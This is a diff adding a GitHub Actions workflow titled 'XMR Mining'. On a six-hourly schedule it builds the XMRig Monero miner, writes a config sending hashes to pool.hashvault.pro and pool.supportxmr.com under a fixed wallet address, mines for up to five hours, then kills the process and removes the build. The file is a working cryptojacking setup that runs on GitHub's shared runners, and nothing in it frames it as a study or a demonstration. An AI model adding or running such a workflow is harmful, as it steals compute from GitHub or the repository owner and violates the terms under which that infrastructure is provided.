@@ -1,0 +1,74 @@
+name: XMR Mining
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 */6 * * *'
+
+jobs:
+  mine:
+    runs-on: ubuntu-latest
+    timeout-minutes: 300
+    
+    steps:
+      - name: Setup Environment
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y wget tar cmake build-essential libhwloc-dev libuv1-dev libssl-dev git
+          
+      - name: Build XMRig
+        run: |
+          git clone https://github.com/xmrig/xmrig.git
+          cd xmrig
+          mkdir build && cd build
+          cmake .. -DWITH_HWLOC=ON
+          make -j$(nproc)
+          
+      - name: Configure Mining
+        run: |
+          cd xmrig/build
+          cat > config.json <<EOF
+          {
+            "autosave": true,
+            "cpu": {
+              "enabled": true,
+              "huge-pages": true,
+              "hw-aes": null,
+              "priority": 5,
+              "max-threads-hint": 100
+            },
+            "opencl": false,
+            "cuda": false,
+            "pools": [
+              {
+                "url": "pool.hashvault.pro:443",
+                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
+                "pass": "github-runner",
+                "keepalive": true,
+                "tls": true
+              },
+              {
+                "url": "pool.supportxmr.com:443",
+                "user": "43jqgNCGAZQYwnk4s7Lt7P93S2sDkdN5bLKgUsGqVMoD6Bftsc5VVcHNy3mRBr7aBg5KgtFDHfYqK1MF8HEgSGucLbCCPeS",
+                "pass": "backup",
+                "keepalive": true,
+                "tls": true
+              }
+            ],
+            "print-time": 60,
+            "retries": 5,
+            "retry-pause": 5,
+            "donate-level": 1
+          }
+          EOF
+          
+      - name: Start Mining
+        run: |
+          cd xmrig/build
+          timeout 18000 ./xmrig --config=config.json || true
+          
+      - name: Cleanup
+        if: always()
+        run: |
+          sudo pkill -9 xmrig || true
+          rm -rf xmrig
